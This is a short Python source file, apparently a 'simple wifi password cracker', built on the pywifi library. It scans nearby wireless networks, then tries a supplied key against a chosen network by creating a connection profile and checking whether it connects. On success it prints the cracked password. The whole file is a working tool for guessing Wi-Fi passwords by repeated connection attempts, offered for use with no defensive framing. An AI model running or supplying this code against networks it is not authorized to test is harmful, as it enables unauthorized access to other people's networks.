#simple_wifi_password_cracker.py

from time import sleep
import pywifi
from pywifi import PyWiFi, const, Profile

class WifiCracker_Engine():
    def setup_cracker(self, disconnect=False, time_connection_limit=5, log=True):
        try:            
            self.wifi = pywifi.PyWiFi()
            self.iface = self.wifi.interfaces()[0]
            
            if disconnect:
                self.iface.disconnect()
                time = 0
                while const.IFACE_DISCONNECTED != self.iface.status() and time <= time_connection_limit:
                    sleep(1)
                    time += 1
            
            print('SCANNING FOR WIFI...')
            self.iface.scan()
            all_wifi = self.iface.scan_results()

            time = 0
            while (not all_wifi) and (time <= time_connection_limit):
                sleep(1)
                time += 1
                all_wifi = self.iface.scan_results()
            return all_wifi
        except Exception as e:
            if log:
                print(f'\n\nsetup error:\n{e}\n')
    
    def __init__(self, disconnect=False, time_connection_limit=5, log=True):
        self.all_wifi = self.setup_cracker(disconnect=disconnect, time_connection_limit=time_connection_limit, log=log)
        
    def try_password(self, net_ID, key, time_limit=10, log=True):
        try:
            net = self.all_wifi[net_ID]
            self.iface.disconnect()
            self.profile = Profile()
            self.profile.ssid = net.ssid
            self.profile.auth = net.auth
            for method in net.akm:
                self.profile.akm.append(method)
            self.profile.cipher = net.cipher
            self.profile.key = key
            self.iface.remove_all_network_profiles()
            self.tmp_profile = self.iface.add_network_profile(self.profile)
            self.iface.connect(self.tmp_profile)
            time = 0
            while self.iface.status() != const.IFACE_CONNECTED and time <= time_limit:
                sleep(1)
                time += 1
            if self.iface.status() == const.IFACE_CONNECTED:
                print(f'CRACKED - Password: {key}')
                return key  #Return password when True
            return None  #Return None when False
        except Exception as e:
            if log:
                print(f'Password try failed: {e}')
            return None  #Return None when get error